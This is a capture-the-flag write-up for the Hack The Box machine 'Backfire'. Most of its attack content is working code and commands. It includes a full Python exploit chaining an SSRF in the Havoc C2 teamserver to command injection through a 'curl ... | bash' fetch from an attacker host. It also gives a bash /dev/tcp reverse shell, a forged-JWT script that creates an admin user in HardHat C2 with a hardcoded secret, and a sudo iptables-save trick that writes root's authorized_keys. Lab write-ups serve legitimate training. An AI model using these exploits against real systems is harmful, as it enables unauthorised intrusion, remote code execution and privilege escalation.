# Backfire Write-up

<img src="https://labs.hackthebox.com/storage/avatars/aa0a93908243c51fe21e691fc6571911.png" width="200" height="200">

## Recon

### Port enumeration with Nmap

`nmap -sC -sV 10.10.11.49`

    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
    | ssh-hostkey:                                                                                                                                                                                                                              
    |_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)                                                                                                                                                                           
    443/tcp  open  ssl/https?                                                                                                                                                                                                                   
    | ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=Florida/countryName=US                                                                                                                                                        
    | Subject Alternative Name: IP Address:127.0.0.1                                                                                                                                                                                            
    | Not valid before: 2024-05-30T05:03:56                                                                                                                                                                                                     
    |_Not valid after:  2027-05-30T05:03:56                                                                                                                                                                                                     
    |_ssl-date: TLS randomness does not represent time                                                                                                                                                                                          
    | tls-alpn:                                                                                                                                                                                                                                 
    |   http/1.1                                                                                                                                                                                                                                
    |   http/1.0                                                                                                                                                                                                                                
    |_  http/0.9                                                                                                                                                                                                                                
    8000/tcp open  http       nginx 1.22.1                                                                                                                                                                                                      
    |_http-server-header: nginx/1.22.1                                                                                                                                                                                                          
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Use the `-p-` flag and perform a full scan of our target.

`nmap -sC -sV -p- 10.10.11.49`  

Add host to `/etc/hosts`.

    sudo echo "10.10.11.49 backfire.htb" | sudo tee -a /etc/hosts

backfire.htb:8000

![image](https://github.com/user-attachments/assets/5e076f97-4d39-4ff3-af45-2377e57cfbe8)

/havoc.yaotl

![image](https://github.com/user-attachments/assets/9f0e32e3-4fa7-4a70-8865-b90ea8066ae8)

Found the following credentials.

`ilya`:`CobaltStr1keSuckz!`

`sergej`:`1w4nt2sw1tch2h4rdh4tc2`

![image](https://github.com/user-attachments/assets/d1805006-5e85-4f1a-9d33-83d7cae3c9ee)

## Exploitation

### Havoc-C2-SSRF-poc

This vulnerability is exploited by spoofing a demon agent registration and checkins to open a TCP socket on the teamserver and `read`/`write` data from it. This allows attackers to leak origin IPs of teamservers and much more.

Exploit: https://github.com/chebuya/Havoc-C2-SSRF-poc

Clone repo.

    git clone Havoc-C2-SSRF-poc

Run SSRF PoC with the credentials found in the configs before.

    python3 exploit.py -t https://backfire.htb/ -u ilya -i <IP> -p <PORT>

![image](https://github.com/user-attachments/assets/e2cb4ea4-0b2a-4de6-a552-d7060499ff95)

Lsiten port.

![image](https://github.com/user-attachments/assets/827d0513-8c42-4819-b147-b1085a83b532)

This PoC works, but it's not enough to get a full reverse shell.

Since `Websocket` communication is used, the corresponding data also needs to be converted to the `Websocket` format. It is encapsulated in Python's own library, but here they are converted from `HTTP`, so the data must be converted manually into the Websocket data frame.

The code looks like this:

    import os
    import json
    import hashlib
    import binascii
    import random
    import requests
    import argparse
    import urllib3
    from Crypto.Cipher import AES
    from Crypto.Util import Counter
    
    urllib3.disable_warnings()
    
    key_bytes = 32
    
    def decrypt(key, iv, ciphertext):
        if len(key) <= key_bytes:
            for _ in range(len(key), key_bytes):
                key += b"0"
    
        assert len(key) == key_bytes
    
        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)
    
        plaintext = aes.decrypt(ciphertext)
        return plaintext
    
    
    def int_to_bytes(value, length=4, byteorder="big"):
        return value.to_bytes(length, byteorder)
    
    
    def encrypt(key, iv, plaintext):
        if len(key) <= key_bytes:
            for x in range(len(key), key_bytes):
                key = key + b"0"
    
        assert len(key) == key_bytes
    
        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)
    
        ciphertext = aes.encrypt(plaintext)
        return ciphertext
    
    
    def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
        command = b"\x00\x00\x00\x63"
        request_id = b"\x00\x00\x00\x01"
        demon_id = agent_id
    
        hostname_length = int_to_bytes(len(hostname))
        username_length = int_to_bytes(len(username))
        domain_name_length = int_to_bytes(len(domain_name))
        internal_ip_length = int_to_bytes(len(internal_ip))
        process_name_length = int_to_bytes(len(process_name) - 6)
    
        data = b"\xab" * 100
    
        header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data
    
        size = 12 + len(header_data)
        size_bytes = size.to_bytes(4, 'big')
        agent_header = size_bytes + magic + agent_id
        print(agent_header + header_data)
        print("[***] Trying to register agent...")
        r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
        if r.status_code == 200:
            print("[***] Success!")
        else:
            print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")
    
    
    def open_socket(socket_id, target_address, target_port):
        command = b"\x00\x00\x09\xec"
        request_id = b"\x00\x00\x00\x02"
        subcommand = b"\x00\x00\x00\x10"
        sub_request_id = b"\x00\x00\x00\x03"
        local_addr = b"\x22\x22\x22\x22"
        local_port = b"\x33\x33\x33\x33"
    
        forward_addr = b""
        for octet in target_address.split(".")[::-1]:
            forward_addr += int_to_bytes(int(octet), length=1)
    
        forward_port = int_to_bytes(target_port)
    
        package = subcommand + socket_id + local_addr + local_port + forward_addr + forward_port
        package_size = int_to_bytes(len(package) + 4)
    
        header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)
    
        size = 12 + len(header_data)
        size_bytes = size.to_bytes(4, 'big')
        agent_header = size_bytes + magic + agent_id
        data = agent_header + header_data
    
        print("[***] Trying to open socket on the teamserver...")
        r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
        if r.status_code == 200:
            print("[***] Success!")
        else:
            print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")
    
    
    def write_socket(socket_id, data):
        command = b"\x00\x00\x09\xec"
        request_id = b"\x00\x00\x00\x08"
        subcommand = b"\x00\x00\x00\x11"
        sub_request_id = b"\x00\x00\x00\xa1"
        socket_type = b"\x00\x00\x00\x03"
        success = b"\x00\x00\x00\x01"
    
        data_length = int_to_bytes(len(data))
    
        package = subcommand + socket_id + socket_type + success + data_length + data
        package_size = int_to_bytes(len(package) + 4)
    
        header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)
    
        size = 12 + len(header_data)
        size_bytes = size.to_bytes(4, 'big')
        agent_header = size_bytes + magic + agent_id
        post_data = agent_header + header_data
        print(post_data)
        print("[***] Trying to write to the socket")
        r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
        if r.status_code == 200:
            print("[***] Success!")
        else:
            print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")
    
    
    def read_socket(socket_id):
        command = b"\x00\x00\x00\x01"
        request_id = b"\x00\x00\x00\x09"
    
        header_data = command + request_id
    
        size = 12 + len(header_data)
        size_bytes = size.to_bytes(4, 'big')
        agent_header = size_bytes + magic + agent_id
        data = agent_header + header_data
    
        print("[***] Trying to poll teamserver for socket output...")
        r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
        if r.status_code == 200:
            print("[***] Read socket output successfully!")
        else:
            print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""
    
        command_id = int.from_bytes(r.content[0:4], "little")
        request_id = int.from_bytes(r.content[4:8], "little")
        package_size = int.from_bytes(r.content[8:12], "little")
        enc_package = r.content[12:]
    
        return decrypt(AES_Key, AES_IV, enc_package)[12:]
    
    
    
    def create_websocket_request(host, port):
        request = (
            f"GET /havoc/ HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        ).encode()
        return request
    
    
    def build_websocket_frame(payload):
        payload_bytes = payload.encode("utf-8")
        frame = bytearray()
        frame.append(0x81)
        payload_length = len(payload_bytes)
        if payload_length <= 125:
            frame.append(0x80 | payload_length)
        elif payload_length <= 65535:
            frame.append(0x80 | 126)
            frame.extend(payload_length.to_bytes(2, byteorder="big"))
        else:
            frame.append(0x80 | 127)
            frame.extend(payload_length.to_bytes(8, byteorder="big"))
    
        masking_key = os.urandom(4)
        frame.extend(masking_key)
        masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
        frame.extend(masked_payload)
    
        return frame
    
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
    parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
    parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
    parser.add_argument(
        "-A",
        "--user-agent",
        help="The User-Agent for the spoofed agent",
        default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    )
    parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
    parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
    parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
    parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
    parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")
    
    args = parser.parse_args()
    
    magic = b"\xde\xad\xbe\xef"
    teamserver_listener_url = args.target
    headers = {
        "User-Agent": args.user_agent
    }
    agent_id = int_to_bytes(random.randint(100000, 1000000))
    AES_Key = b"\x00" * 32
    AES_IV = b"\x00" * 16
    hostname = bytes(args.hostname, encoding="utf-8")
    username = bytes(args.username, encoding="utf-8")
    domain_name = bytes(args.domain_name, encoding="utf-8")
    internal_ip = bytes(args.internal_ip, encoding="utf-8")
    process_name = args.process_name.encode("utf-16le")
    process_id = int_to_bytes(random.randint(1000, 5000))
    
    register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
    
    socket_id = b"\x11\x11\x11\x11"
    open_socket(socket_id, args.ip, int(args.port))
    
    USER = "ilya"
    PASSWORD = "CobaltStr1keSuckz!"
    host = "127.0.0.1"
    port = 40056
    websocket_request = create_websocket_request(host, port)
    write_socket(socket_id, websocket_request)
    response = read_socket(socket_id)
    
    payload = {
        "Body": {
            "Info": {
                "Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(),
                "User": USER
            },
            "SubEvent": 3
        },
        "Head": {
            "Event": 1,
            "OneTime": "",
            "Time": "18:40:17",
            "User": USER
        }
    }
    payload_json = json.dumps(payload)
    frame = build_websocket_frame(payload_json)
    write_socket(socket_id, frame)
    response = read_socket(socket_id)
    
    payload = {
        "Body": {
            "Info": {
                "Headers": "",
                "HostBind": "0.0.0.0",
                "HostHeader": "",
                "HostRotation": "round-robin",
                "Hosts": "0.0.0.0",
                "Name": "abc",
                "PortBind": "443",
                "PortConn": "443",
                "Protocol": "Https",
                "Proxy Enabled": "false",
                "Secure": "true",
                "Status": "online",
                "Uris": "",
                "UserAgent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
            },
            "SubEvent": 1
        },
        "Head": {
            "Event": 2,
            "OneTime": "",
            "Time": "08:39:18",
            "User": USER
        }
    }
    payload_json = json.dumps(payload)
    frame = build_websocket_frame(payload_json)
    write_socket(socket_id, frame)
    response = read_socket(socket_id)
    
    cmd = "curl http://10.10.xx.xx:8000/payload.sh | bash"
    injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
    payload = {
        "Body": {
            "Info": {
                "AgentType": "Demon",
                "Arch": "x64",
                "Config": "{\n \"Amsi/Etw Patch\": \"None\",\n \"Indirect Syscall\": false,\n \"Injection\": {\n \"Alloc\": \"Native/Syscall\",\n \"Execute\": \"Native/Syscall\",\n \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n },\n \"Jitter\": \"0\",\n \"Proxy Loading\": \"None (LdrLoadDll)\",\n \"Service Name\":\"" + injection + "\",\n \"Sleep\": \"2\",\n \"Sleep Jmp Gadget\": \"None\",\n \"Sleep Technique\": \"WaitForSingleObjectEx\",\n \"Stack Duplication\": false\n}\n",
                "Format": "Windows Service Exe",
                "Listener": "abc"
            },
            "SubEvent": 2
        },
        "Head": {
            "Event": 5,
            "OneTime": "true",
            "Time": "18:39:04",
            "User": USER
        }
    }
    payload_json = json.dumps(payload)
    frame = build_websocket_frame(payload_json)
    write_socket(socket_id, frame)
    response = read_socket(socket_id)

Change ip and port.

![image](https://github.com/user-attachments/assets/958c71c9-7b92-448d-95a8-79fa0a8372f3)

Run exploit and listen your port.

    python3 SSRF_TO_RCE.py --target https://10.10.11.49 -i 127.0.0.1 -p 40056

![image](https://github.com/user-attachments/assets/cf3404af-bbb9-4f06-ad1f-1c44458e619e)

Create reverseshell payload and open python server.

    #!/bin/bash
    bash -i >& /dev/tcp/<YOUR-IP>/1234 0>&1

![image](https://github.com/user-attachments/assets/b52ac504-6fa7-464f-8494-b12a93d2e952)

Get shell.

![image](https://github.com/user-attachments/assets/82f4a9b2-9c91-4073-8c1a-48ed3aa41956)

Get the user flag!

![image](https://github.com/user-attachments/assets/2df4486d-44b6-4eb8-8d21-a68a4b68c2a5)

### Privilege escalation

Generate new public ssh key. 

    ssh-keygen -t rsa -b 2048

To add our public key on the server.

Create `.ssh` directory.

    mkdir -p ~/.ssh

Write our public key into `~/.ssh/authorized_keys`.

    echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

Make sure that the permissions for the authorized_keys file and the .ssh directory are set correctly.

    chmod 700 ~/.ssh
    chmod 600 ~/.ssh/authorized_keys

Connect to machine by SSH using our key. 

    ssh -i path/to/key ilya@backfire.htb

![image](https://github.com/user-attachments/assets/ad920c2a-6319-4800-9670-c26db603f07c)

hardhat.txt file.

![image](https://github.com/user-attachments/assets/2a1d5164-195b-4861-80db-87ac07b0a1d7)

    netstat -a

![image](https://github.com/user-attachments/assets/aca87839-8572-4d0c-a014-87aecfb5314d)

Port forwarding `5000` and `7096` ports.

    ssh -i key ilya@backfire.htb -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000

![image](https://github.com/user-attachments/assets/1b267bef-b786-4810-b082-942911b9c0a9)

Try to open: https://127.0.0.1:7096

![image](https://github.com/user-attachments/assets/78ea7bdf-f6c8-4e0f-a35c-1ce29bc65a33)

Use this exploit to create a new user with the credentials `strongusername`:`strongpassword`.

    import jwt  
    import datetime  
    import uuid  
    import requests  
      
    rhost = '127.0.0.1:5000'  
      
    # Craft Admin JWT  
    secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"  
    issuer = "hardhatc2.com"  
    now = datetime.datetime.utcnow()  
      
    expiration = now + datetime.timedelta(days=28)  
    payload = {  
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),  
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",  
    "iss": issuer,  
    "aud": issuer,  
    "iat": int(now.timestamp()),  
    "exp": int(expiration.timestamp()),  
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"  
    }  
      
    token = jwt.encode(payload, secret, algorithm="HS256")  
    print("Generated JWT:")  
    print(token)  
      
    # Use Admin JWT to create a new user 'sth_pentest' as TeamLead  
    burp0_url = f"https://{rhost}/Login/Register"  
    burp0_headers = {  
    "Authorization": f"Bearer {token}",  
    "Content-Type": "application/json"  
    }  
    burp0_json = {  
    "password": "strongpassword",  
    "role": "TeamLead",  
    "username": "strongusername"  
    }  
    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)  
    print(r.text)

![image](https://github.com/user-attachments/assets/9d2b02fa-7e1f-4c2b-b2fc-1e1c6ed8e5cf)

![image](https://github.com/user-attachments/assets/1fc599fc-9ff5-4b2f-ab86-c01ee20dd626)

Open `/ImplantInteract` page and add terminal.

![image](https://github.com/user-attachments/assets/70a60838-82a2-4bf1-8418-ce72dd50dc3e)

Scroll down and add our ssh public key to `authorized_keys` via `echo` command.

    echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

![image](https://github.com/user-attachments/assets/12eec708-9552-413a-a869-499bd31b7935)

    ssh -i key sergej@backfire.htb

![image](https://github.com/user-attachments/assets/9cc091f9-324f-46e4-a6c3-f603c9bdae06)

We can use the following instruction to escalate privileges:

https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/

Generate new ssh key.

    ssh-keygen -t ed25519
    
Add a rule with our sshkey in the comments.
 
    sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nYOUR SSH PUBLIC KEY\n'  
      
Verify comment with iptables 

    sudo iptables -S  

Save into authorized_keys.

    sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys  

![image](https://github.com/user-attachments/assets/b627512d-0837-4240-9676-863f1451a1ff)

Try to connect as root user.

    ssh -i sshkey root@backfire.htb

![image](https://github.com/user-attachments/assets/d0fd61d7-825e-4c65-b819-3c786b1fc75e)

Get the root flag!

![image](https://github.com/user-attachments/assets/6c528e26-b74c-4172-8b37-370eaaea1b78)
